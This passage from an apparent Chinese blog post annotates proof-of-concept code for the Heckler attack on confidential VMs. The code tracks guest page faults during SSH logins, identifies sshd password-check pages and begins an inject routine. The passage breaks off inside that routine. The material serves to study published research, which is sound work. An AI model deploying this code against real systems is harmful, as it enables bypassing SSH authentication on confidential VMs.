class="line"></span><br></pre></td></tr></table></figure>





<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_track_once</span>(<span class="params">self, boot,</span></span><br><span class="line"><span class="params">                    gpa_to_track=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                    timeout_s=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                    event_timeout=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">                    wait_before_go=<span class="literal">False</span></span>):</span><br><span class="line">        self.do_page_tracking_ready = <span class="literal">False</span></span><br><span class="line">        self.do_page_tracking_stopped = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> wait_before_go:</span><br><span class="line">            self.do_page_tracking = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.do_page_tracking = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        run_list = []</span><br><span class="line">        run_set = OrderedSet()</span><br><span class="line">        pfs = &#123;&#125;</span><br><span class="line">        last_gpa = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">th_timeout</span>():</span><br><span class="line">            time.sleep(timeout_s)</span><br><span class="line">            self.do_page_tracking = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        th = threading.Thread(target=th_timeout, args=[], daemon=<span class="literal">True</span>)</span><br><span class="line">        h.heckler_init()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> timeout_s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            th.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> boot:</span><br><span class="line">            h.heckler_enable_boot_tracking()</span><br><span class="line">            <span class="keyword">assert</span> gpa_to_track <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(gpa_to_track) == <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h.heckler_enable_tracking()</span><br><span class="line">            h.heckler_untrack_all_pages()</span><br><span class="line">            <span class="keyword">if</span> gpa_to_track <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(gpa_to_track) == <span class="number">0</span>:</span><br><span class="line">                h.heckler_track_all_pages()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> gpa <span class="keyword">in</span> gpa_to_track:</span><br><span class="line">                    h.heckler_track_page(gpa)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;marking <span class="subst">&#123;<span class="built_in">len</span>(gpa_to_track)&#125;</span> pages&quot;</span>)</span><br><span class="line"></span><br><span class="line">        acked = <span class="literal">True</span></span><br><span class="line">        errors = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        self.do_page_tracking_ready = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> wait_before_go:</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> self.do_page_tracking:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> self.do_page_tracking:</span><br><span class="line">                acked = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">if</span> event_timeout:</span><br><span class="line">                    ev = h.heckler_block_until_event_timeout(<span class="number">5</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ev = h.heckler_block_until_event()</span><br><span class="line">                <span class="keyword">if</span> ev <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> ev.get(<span class="string">&#x27;ret&#x27;</span>) == <span class="number">1</span> <span class="keyword">or</span> ev.get(<span class="string">&#x27;gpa&#x27;</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> ev <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">if</span> ev.get(<span class="string">&#x27;ret&#x27;</span>) == h.HECKLER_ERR_ABORT:</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                    errors = errors + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> errors &gt; <span class="number">300</span>:</span><br><span class="line">                        <span class="built_in">print</span>(ev)</span><br><span class="line">                        <span class="built_in">print</span>(errors)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        h.heckler_ack_event()</span><br><span class="line">                        acked = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                gpa = <span class="built_in">int</span>(ev.get(<span class="string">&#x27;gpa&#x27;</span>))</span><br><span class="line">                <span class="keyword">if</span> gpa <span class="keyword">not</span> <span class="keyword">in</span> pfs:</span><br><span class="line">                    pfs[gpa] = <span class="number">0</span></span><br><span class="line">                pfs[gpa] += <span class="number">1</span></span><br><span class="line">                run_list.append(gpa)</span><br><span class="line">                run_set.add(gpa)</span><br><span class="line">                last_gpa = gpa</span><br><span class="line"></span><br><span class="line">                h.heckler_ack_event()</span><br><span class="line">                acked = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> acked:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                h.heckler_ack_event()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">        self.do_page_tracking_stopped = <span class="literal">True</span></span><br><span class="line">        h.heckler_untrack_all_pages()</span><br><span class="line">        h.heckler_clean_up()</span><br><span class="line"></span><br><span class="line">        pf_analysis = &#123;</span><br><span class="line">            <span class="string">&#x27;run_list&#x27;</span>: run_list,</span><br><span class="line">            <span class="string">&#x27;run_set&#x27;</span>: run_set,</span><br><span class="line">            <span class="string">&#x27;pfs&#x27;</span>: pfs,</span><br><span class="line">        &#125;</span><br><span class="line">        self.do_page_tracking = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> pf_analysis</span><br></pre></td></tr></table></figure>









<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_do_profile</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">                do_trace,</span></span><br><span class="line"><span class="params">                include_set=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                max_hit=<span class="literal">None</span></span>):</span><br><span class="line">    self._kill_utility()</span><br><span class="line">    ssh_conn = SshConnection()</span><br><span class="line">    ssh_conn.prepare()</span><br><span class="line">    ssh_conn.establish_connection_pw_wrong_once()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_handshake</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">nonlocal</span> ssh_conn</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.do_page_tracking_ready:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Doing ssh login...&quot;</span>)</span><br><span class="line">        self.do_page_tracking = <span class="literal">True</span></span><br><span class="line">        ssh_conn.enter_password()</span><br><span class="line">        self.do_page_tracking = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    th_ssh_conn = threading.Thread(target=do_handshake,</span><br><span class="line">                                   args=[self],</span><br><span class="line">                                   daemon=<span class="literal">False</span>)</span><br><span class="line">    th_ssh_conn.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> do_trace:</span><br><span class="line">        res = self._track_trace(include_set,</span><br><span class="line">                                max_hit=max_hit,</span><br><span class="line">                                wait_before_go=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = self._track_once(boot=<span class="literal">False</span>,</span><br><span class="line">                               gpa_to_track=include_set,</span><br><span class="line">                               event_timeout=<span class="literal">False</span>,</span><br><span class="line">                               wait_before_go=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Waiting for tracking thread to join() (hit ctrl-c to quit)&quot;</span>)</span><br><span class="line">    th_ssh_conn.join()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_do_trace</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">              include_set,</span></span><br><span class="line"><span class="params">              max_hit=<span class="number">30</span></span>):</span><br><span class="line">    trace_results = self._do_profile(<span class="literal">True</span>, include_set=include_set, max_hit=max_hit)</span><br><span class="line">    self._kill_utility()</span><br><span class="line"></span><br><span class="line">    run_list = trace_results[<span class="string">&#x27;run_list&#x27;</span>]</span><br><span class="line">    run_set = trace_results[<span class="string">&#x27;run_set&#x27;</span>]</span><br><span class="line">    self._dump(<span class="string">&#x27;trace_results&#x27;</span>, trace_results)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> run_list, run_set</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>(<span class="params">self, include_set=<span class="literal">None</span></span>):</span><br><span class="line">    track_once_results = self._do_profile(<span class="literal">False</span>, include_set=include_set)</span><br><span class="line">    run_set = track_once_results[<span class="string">&#x27;run_set&#x27;</span>]</span><br><span class="line">    self._dump(<span class="string">&#x27;track_once_results&#x27;</span>, track_once_results)</span><br><span class="line">    <span class="keyword">return</span> run_set</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trace</span>(<span class="params">self, total_include_set, index=<span class="number">0</span></span>):</span><br><span class="line">    trace_list, run_set = self._do_trace(total_include_set)</span><br><span class="line">    self._santiy_check(trace_list, <span class="string">&quot;application trace&quot;</span>)</span><br><span class="line"></span><br><span class="line">    self._dump(<span class="string">f&quot;trace_list_<span class="subst">&#123;index&#125;</span>&quot;</span>, trace_list, force=<span class="literal">False</span>)</span><br><span class="line">    self._dump(<span class="string">&quot;run_set_latest&quot;</span>, trace_list, force=<span class="literal">False</span>, time_suffix=<span class="literal">False</span>)</span><br><span class="line">    self._dump(<span class="string">&quot;ground_truth&quot;</span>,</span><br><span class="line">               &#123;<span class="string">&#x27;mm_answer_authpassword&#x27;</span>: self.page_sshd_mm_answer_authpassword,</span><br><span class="line">                <span class="string">&#x27;auth_password&#x27;</span>: self.page_sshd_auth_password&#125;, force=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> trace_list, run_set</span><br></pre></td></tr></table></figure>

<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p><strong>page set&#x2F;trace 记录的都是GPA</strong> 从page fault中拿到的GPA</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">total_include_set = OrderedSet()</span><br><span class="line">total_exclude_set = OrderedSet()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Boot set</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">console.rule(<span class="string">&quot;Profiling Boot (S_Boot)&quot;</span>)</span><br><span class="line">boot_set = self.boot()</span><br><span class="line">total_exclude_set.update(boot_set)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Idle Execution</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">console.rule(<span class="string">f&quot;Profiling idle execution&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Profiling <span class="subst">&#123;i&#125;</span>...&quot;</span>)</span><br><span class="line">    exclude = self._track_once(boot=<span class="literal">False</span>, timeout_s=<span class="number">5</span>)</span><br><span class="line">    exclude_set = exclude[<span class="string">&#x27;run_set&#x27;</span>]</span><br><span class="line">    total_exclude_set.update(exclude_set)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Application Set</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Profiling ssh login attempt <span class="subst">&#123;i + <span class="number">1</span>&#125;</span> (S_App)&quot;</span>)</span><br><span class="line">    include_set = self.profile(total_include_set)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(total_include_set) == <span class="number">0</span>:</span><br><span class="line">    	total_include_set.update(include_set)</span><br><span class="line">    	total_include_set.difference_update(total_exclude_set)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	total_include_set.intersection_update(include_set)</span><br><span class="line">    	total_include_set.difference_update(total_exclude_set)</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Application Trace</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">candidates = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">	console.rule(<span class="string">f&quot;Profiling application trace (<span class="subst">&#123;i&#125;</span>)&quot;</span></span><br><span class="line">	<span class="string">f&quot;(PT_App with |S_App|=<span class="subst">&#123;<span class="built_in">len</span>(total_include_set)&#125;</span>)&quot;</span>)</span><br><span class="line">    self._sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    run_list, run_set = self.trace(total_include_set, i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Collected trace of <span class="subst">&#123;<span class="built_in">len</span>(run_list)&#125;</span> pages (PT_App)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    new_candidates = find_candidates(run_list,</span><br><span class="line">    run_set,</span><br><span class="line">    self.page_sshd_auth_password,</span><br><span class="line">    self.page_sshd_mm_answer_authpassword,</span><br><span class="line">    debug=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    candidates = self._filter_candidates(new_candidates,</span><br><span class="line">    candidates,</span><br><span class="line">    run_list,</span><br><span class="line">    debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>



<h3 id="构造gadget"><a href="#构造gadget" class="headerlink" title="构造gadget"></a>构造gadget</h3><p>最tricky的一步：如何在PTapp里找到Aseq？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">XXX:</span> this approach ignores the back jump from</span></span><br><span class="line"><span class="comment"># auth_password -&gt; mm_answer_authpassword and tries to find the gadgets</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># for some CVM, we do not find a direct backjump but a strange</span></span><br><span class="line"><span class="comment"># ping pong pattern of auth_password and some other page even though the backjump</span></span><br><span class="line"><span class="comment"># should only be occurring once in a perfect trace sequence</span></span><br><span class="line"><span class="comment"># mm_answer_authpassword -&gt; auth_password .... backjump: auth_password -&gt; mm_answer_authpassword.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># instead, auth_password ping pongs with some other page until max_hit is reached.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># this is puzzling and may be caused by spurious page faults</span></span><br><span class="line"><span class="comment"># this function is a workaround and tries to find gadget page with no distinct</span></span><br><span class="line"><span class="comment"># auth_password -&gt; mm_answer_authpassword backjump.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_find_no_direct_backjump</span>(<span class="params">run_list, run_set,</span></span><br><span class="line"><span class="params">                            gt_auth_password,</span></span><br><span class="line"><span class="params">                            gt_mm_answer_authpassword,</span></span><br><span class="line"><span class="params">                            debug=<span class="literal">False</span></span>):</span><br><span class="line">    auth_password_list = []</span><br><span class="line">    mm_answer_authpassword_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> run_set:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">6</span> &lt;= run_list.count(addr) &lt;= <span class="number">9</span>:</span><br><span class="line">            mm_answer_authpassword_list.append(addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">30</span> &lt;= run_list.count(addr) &lt;= <span class="number">30</span>:</span><br><span class="line">            auth_password_list.append(addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;no direct: auth_password_list: <span class="subst">&#123;<span class="built_in">len</span>(auth_password_list)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;no direct: mm_answer_authpassword_list: <span class="subst">&#123;<span class="built_in">len</span>(mm_answer_authpassword_list)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    candidates = []</span><br><span class="line">    <span class="keyword">for</span> auth_password <span class="keyword">in</span> auth_password_list:</span><br><span class="line">        <span class="keyword">for</span> mm_answer_authpassword <span class="keyword">in</span> mm_answer_authpassword_list:</span><br><span class="line">            num_found = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> auth_password == mm_answer_authpassword:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(run_list) - <span class="number">1</span>):</span><br><span class="line">                <span class="comment"># mm_anser_authpasswd -&gt; auth_pwd .... mm_anser_authpasswd</span></span><br><span class="line">                <span class="keyword">if</span> run_list[i] == mm_answer_authpassword <span class="keyword">and</span> \</span><br><span class="line">                        run_list[i + <span class="number">1</span>] == auth_password:</span><br><span class="line">                    <span class="comment"># first auth_password in list</span></span><br><span class="line">                    <span class="keyword">if</span> run_list[:i + <span class="number">1</span>].count(auth_password) == <span class="number">0</span>:</span><br><span class="line">                        j = i + <span class="number">1</span></span><br><span class="line">                        <span class="keyword">while</span> j &lt; <span class="built_in">len</span>(run_list):</span><br><span class="line">                            <span class="keyword">if</span> run_list[j] == mm_answer_authpassword:</span><br><span class="line">                                num_found += <span class="number">1</span></span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                            j = j + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># combination must be unique</span></span><br><span class="line">            <span class="keyword">if</span> num_found == <span class="number">1</span>:</span><br><span class="line">                candidates.append((mm_answer_authpassword, auth_password))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> candidates</span><br></pre></td></tr></table></figure>

<p>runlist里面出现6-9次的gpa是mm_answer_authpassword备选 30次是auth_password备选</p>
<p>互相组合 需要满足mm_anser_authpasswd -&gt; auth_pwd …. mm_anser_authpasswd  即可</p>
<p>看起来不是特别靠谱 但是可以多跑几次取交集</p>
<h3 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">inject</span>(<span class="params">self, gadget_pairs, quit_after_one_inject=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        gadget_pairs: (mm_answer_authpassword, auth_password)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.do_page_tracking = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        lastlast_gpa = <span class="number">0</span></span><br><span class="line">        last_gpa = <span class="number">0</span></span><br><span class="line">        h.heckler_init()</span><br><span class="line"></span><br><span class="line">        h.heckler_enable_tracking()</span><br><span class="line">        h.heckler_untrack_all_pages()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> gadgets <span class="keyword">in</span> gadget_pairs:</span><br><span class="line">            gad1 = gadgets[<span class="number">0</span>]</span><br><span class="line">            gad2 = gadgets[<span class="number">1</span>]</span><br><span class="line">            h.heckler_track_page(gad1)</span><br><span class="line">            h.heckler_track_page(gad2)</span><br><span class="line"></span><br><span class="line">        history = &#123;&#125;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Attack active. Waiting for target gadgets...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        acked = <span class="literal">True</span></span><br><span class="line">        errors = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> self.do_page_tracking:</span><br><span class="line">                acked = <span class="literal">False</span></span><br><span class="line">                ev = h.heckler_block_until_event()</span><br><span class="line">                <span class="keyword">if</span> ev <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> ev.get(<span class="string">&#x27;ret&#x27;</span>) == <span class="number">1</span> <span class="keyword">or</span> ev.get(<span class="string">&#x27;gpa&#x27;</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> ev <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">if</span> ev.get(<span class="string">&#x27;ret&#x27;</span>) == h.HECKLER_ERR_ABORT:</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                    errors = errors + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> 